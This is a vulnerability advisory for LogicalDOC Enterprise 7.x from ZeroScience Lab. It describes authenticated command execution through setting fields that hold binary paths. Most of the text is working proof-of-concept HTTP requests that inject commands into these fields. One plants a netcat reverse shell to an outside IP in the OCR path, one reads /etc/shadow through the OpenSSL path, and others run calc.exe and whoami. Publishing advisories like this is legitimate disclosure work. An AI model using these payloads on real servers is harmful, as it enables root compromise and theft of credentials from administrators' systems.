@@ -1,0 +1,103 @@
+LogicalDOC Enterprise 7.7.4 Post-Auth Command Execution Via Binary Path Manipulation
+
+
+Vendor: LogicalDOC Srl
+Product web page: https://www.logicaldoc.com
+Affected version: 7.7.4
+                  7.7.3
+                  7.7.2
+                  7.7.1
+                  7.6.4
+                  7.6.2
+                  7.5.1
+                  7.4.2
+                  7.1.1
+
+Summary: LogicalDOC is a free document management system that is designed
+to handle and share documents within an organization. LogicalDOC is a content
+repository, with Lucene indexing, Activiti workflow, and a set of automatic
+import procedures.
+
+Desc: LogicalDOC suffers from multiple authenticated OS command execution
+vulnerabilities by manipulating the path of the many binaries included in the
+package when changing the settings with their respected arguments. This can be
+exploited to execute local root privilege escalation attack and/or inject and
+execute arbitrary system commands as the root or SYSTEM user depending on the
+platform affected.
+
+Tested on: Microsoft Windows 10
+           Linux Ubuntu 16.04
+           Java 1.8.0_161
+           Apache-Coyote/1.1
+           Apache Tomcat/8.5.24
+           Apache Tomcat/8.5.13
+           Undisclosed 8.41
+
+
+Vulnerability discovered by Gjoko 'LiquidWorm' Krstic
+                            @zeroscience
+
+
+Advisory ID: ZSL-2018-5452
+Advisory URL: https://www.zeroscience.mk/en/vulnerabilities/ZSL-2018-5452.php
+
+
+26.01.2018
+
+
+
+
+After saving the settings, the command will be executed whenever a user uploads a file
+that was inserted in the 'default.antivirus.includes' list. PoC for antivirus.command:
+--------------------------------------------------------------------------------------
+
+POST /frontend/setting HTTP/1.1
+Host: localhost:8080
+Connection: keep-alive
+Content-Length: 594
+X-GWT-Module-Base: http://localhost:8080/frontend/
+X-GWT-Permutation: 87C7268A2BDB185A47D161B6D6D2DEE8
+Origin: http://localhost:8080
+User-Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36 OPR/50.0.2762.67
+Content-Type: text/x-gwt-rpc; charset=UTF-8
+Accept: */*
+Referer: http://localhost:8080/frontend.jsp?docId=3735554
+Accept-Encoding: gzip, deflate, br
+Accept-Language: en-US,en;q=0.9
+Cookie: GLog=%7B%0A%20%20%20%20trackRPC%3Afalse%0A%7D; JSESSIONID=FCFD7719139A634C8411FD081780BE2A; ldoc-sid=5dd1ea28-36a0-4967-bdd8-2556d16101d7
+
+
+7|0|16|http://localhost:8080/frontend/|2B4A04609097A6274DA6D61C469E4E6B|com.logicaldoc.gui.frontend.client.services.SettingService|saveSettings|[Lcom.logicaldoc.gui.common.client.beans.GUIParameter;/1603922774|com.logicaldoc.gui.common.client.beans.GUIParameter/3041767606|default.antivirus.enabled|true|default.antivirus.excludes|*.tif,*.tiff,*.jpg,*.jpeg,*.png,*.bmp,*.gif,*.txt,*.iso|default.antivirus.includes|*.exe,*.com,*.pif,*.scr,*.dll,*.tar.gz|default.antivirus.timeout|0|antivirus.command|c:\\windows\\system32\\calc.exe|1|2|3|4|1|5|5|5|6|0|7|8|6|0|9|10|6|0|11|12|6|0|13|14|6|0|15|16|
+
+
+
+PoC for call home reverse shell via ocr.Tesseract.path:
+-------------------------------------------------------
+
+POST /frontend/setting HTTP/1.1
+Host: localhost:8080
+
+
+7|0|25|https://localhost:8080/frontend/|2B4A04609097A6274DA6D61C469E4E6B|com.logicaldoc.gui.frontend.client.services.SettingService|saveSettings|[Lcom.logicaldoc.gui.common.client.beans.GUIParameter;/1603922774|com.logicaldoc.gui.common.client.beans.GUIParameter/3041767606|default.ocr.includes|*.pdf,*.tif,*.png,*.jpg,*.txt|default.ocr.excludes|*.odt|default.ocr.text.threshold|1|default.ocr.resolution.threshold|400|ocr.timeout|90|ocr.rendres|180|ocr.rendres.barcode|ocr.batch|2|ocr.engine|Tesseract|ocr.Tesseract.path|nc -c /bin/sh 10.0.0.17 4444|1|2|3|4|1|5|5|10|6|0|7|8|6|0|9|10|6|0|11|12|6|0|13|14|6|0|15|16|6|0|17|18|6|0|19|18|6|0|20|21|6|0|22|23|6|0|24|25|
+
+
+
+PoC for Key Store via OpenSSL path:
+-----------------------------------
+
+POST /frontend/sign HTTP/1.1
+Host: localhost:8080
+
+
+7|0|14|https://localhost:8080/frontend/|16A5065211C47142C5282B2BC4600F1D|com.logicaldoc.gui.frontend.client.services.SignService|generateNewKeystore|com.logicaldoc.gui.common.client.beans.GUIKeystore/3815185030|java.util.Date/3385151746|1337|/usr/bin/openssl && /usr/bin/cat /etc/shadow|root|O=ZSL,OU=JXY,C=MK|123|#000000|$PAGE_WIDTH/6|5|1|2|3|4|1|5|5|6|WFn2zQZ|A|7|8|9|10|0|11|12|60|100|0|13|14|14|B|2|
+
+
+
+PoC for clients and external apps and services path via command.convert, command.gs, command.openssl, command.pdftohtml, command.keytool:
+-----------------------------------------------------------------------------------------------------------------------------------------
+
+POST /frontend/setting HTTP/1.1
+Host: localhost:8080
+
+
+7|0|35|https://localhost:8080/frontend/|2B4A04609097A6274DA6D61C469E4E6B|com.logicaldoc.gui.frontend.client.services.SettingService|saveSettings|[Lcom.logicaldoc.gui.common.client.beans.GUIParameter;/1603922774|com.logicaldoc.gui.common.client.beans.GUIParameter/3041767606|webservice.enabled|true|webdav.enabled|webdav.usecache|false|command.convert|/usr/bin/whoami > test.txt|command.gs|/usr/bin/gs|command.openssl|/usr/bin/openssl|command.pdftohtml|/usr/bin/pdftohtml|command.keytool|1337|cmis.enabled|cmis.changelog|cmis.maxitems|200|default.extcall.enabled|default.extcall.name|External Call|default.extcall.baseurl||default.extcall.suffix|default.extcall.window|_blank|default.extcall.params|user|1|2|3|4|1|5|5|17|6|0|7|8|6|0|9|8|6|0|10|11|6|0|12|13|6|0|14|15|6|0|16|17|6|0|18|19|6|0|20|21|6|0|22|8|6|0|23|8|6|0|24|25|6|0|26|11|6|0|27|28|6|0|29|30|6|0|31|30|6|0|32|33|6|0|34|35|
